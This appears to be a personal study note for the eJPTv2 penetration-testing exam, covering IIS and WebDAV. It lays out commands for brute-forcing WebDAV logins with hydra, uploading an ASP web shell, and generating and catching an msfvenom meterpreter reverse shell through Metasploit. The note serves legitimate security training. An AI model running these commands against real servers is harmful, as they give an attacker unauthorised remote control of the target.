Tags: #template 
Related to: #note-taking, #notes
See also: 
Index: [[📁EJPTv2 - INDEX]]] - index location 

#### Summary
Add a brief overview of what the content is

#### IIS
IIS - Propriotary - has GUI for managing websies

Can run static and dynamic pages using ASP.NET and PHP

Runs typically in 80 or 443

WebDAV 
Used for editing and managing files on servers

Runs on top of Apache or IIS on 80 or 443  

Requires Authentication

---

Exploiting Web dav

- Discover WEbdav
-  Brute force on server
- After Auth upload .asp payload for revese shell

Tools

- davtest - scan auth and exploit webdav server
- cadaver - working with webdav

Nmap scripts

http-webdav-scan
http-enum


Brute force - hydra

`hydra -L /path/to/username list  -P /path/to/password list ip http-get /webdav/
`
Using Davtest
`davtest -url <target-server>/webdav` - unauthenticated

`davtest -auth username:password -url <target-server>/webdav`

Checks webdav conection and finds out what files can be uploaded and what files can be executed

Using cadaver

cadaver http://targert-url

upload web shell
`put /usr/share/webshells/asp/webshell.asp`

Exploiting using metasploit - reverese shell

- Generating metasploit payload
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-id LPORT=a port in attacker machine -f asp > filename.asp`
- upload as before using cadaver

- start postgresql n msfconsole- `service postgresql start && msfconsole`
- To setup listener`use multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- Set the LHOST and LPORT as before
- run the listener

run getuid and sysinfo to understand sys and user priv

OR

`use /exploit/windows/iis/iss_webdav_upload_asp`

